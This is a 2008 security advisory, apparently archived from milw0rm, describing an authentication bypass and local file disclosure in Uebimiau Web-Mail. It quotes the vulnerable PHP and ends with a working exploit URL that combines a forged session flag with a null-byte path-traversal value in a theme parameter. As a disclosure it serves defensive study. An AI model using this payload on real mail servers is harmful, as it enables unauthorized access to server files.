<html><head><title>Uebimiau Web-Mail 2.7.10/2.7.2 Remote File Disclosure Vulnerability</title></head><pre>----[ Uebimiau Web-Mail Remote File Reader ... ITDefence.ru Antichat.ru ]

							Uebimiau Web-Mail Remote File Reader
							Eugene Minaev underwater@itdefence.ru
				___________________________________________________________________
			____/  __ __ _______________________ _______  _______________    \  \   \
			/ .\  /  /_// //              /        \       \/      __       \   /__/   /
			/ /     /_//              /\        /       /      /         /     /___/
			\/        /              / /       /       /\     /         /         /
			/        /               \/       /       / /    /         /__       //\
			\       /    ____________/       /        \/    __________// /__    // /   
			/\\      \_______/        \________________/____/  2007    /_//_/   // //\
			\ \\                                                               // // /
			.\ \\        -[     ITDEFENCE.ru Security advisory     ]-         // // / . 
			. \_\\________[________________________________________]_________//_//_/ . .
		 
		
		At first i decided to look login script . Each script includes this code
		
		&lt;?php
		if(strlen($f_pass) &gt; 0) {

		..elseif (
		($sess[&quot;auth&quot;] &amp;&amp; intval((time()-$start)/60) &lt; $idle_timeout)) {

		$UM-&gt;mail_user   = $f_user    = $sess[&quot;user&quot;];
		$UM-&gt;mail_pass   = $f_pass    = $sess[&quot;pass&quot;];
		$UM-&gt;mail_server = $f_server  = $sess[&quot;server&quot;];
		$UM-&gt;mail_email  = $f_email   = $sess[&quot;email&quot;];

		} else {
		Header(&quot;Location: ./index.php?tid=$tid&amp;lid=$lid\r\n&quot;); 
		exit; 
		} 
		?&gt;
		
		So , if register_globals on , we can make a request like script.php?f_pass=+toxa+&amp;sess[auth]=1 
		to make script think that we are authorized user . Then i looked each script to find something 
		interest.
		
		&lt;?php
		define(&quot;SMARTY_DIR&quot;,&quot;./smarty/&quot;);
		require_once(SMARTY_DIR.&quot;Smarty.class.php&quot;);
		$smarty = new Smarty;
		$smarty-&gt;compile_dir = $temporary_directory;
		$smarty-&gt;security=true;
		$smarty-&gt;secure_dir=array(&quot;./&quot;);
		$smarty-&gt;assign(&quot;umLanguageFile&quot;,$selected_language.&quot;.txt&quot;);  
		?&gt;
		
		Looks great  :)  But selected_language was already defined . But there was a similar code with EXTRACT.
		So , we can read local files on server !
		
		&lt;?php
		if($phpver &gt;= 4.1) {
		extract($_GET);
		}

		$smarty-&gt;assign(&quot;umSid&quot;,$sid);
		$smarty-&gt;assign(&quot;umLid&quot;,$lid);
		$smarty-&gt;assign(&quot;umTid&quot;,$tid);

		$smarty-&gt;assign(&quot;umErrorCode&quot;,$err);

		$smarty-&gt;display(&quot;$selected_theme/error.htm&quot;);
		?&gt;
		
		http://test1.ru/uebimiau/error.php?f_pass=blackybr&amp;sess[auth]=1&amp;selected_theme=../ksuri.php%00
		
		
		

----[ FROM RUSSIA WITH LOVE :: underWHAT?! , gemaglabin ]

# milw0rm.com [2008-01-06]</pre></html>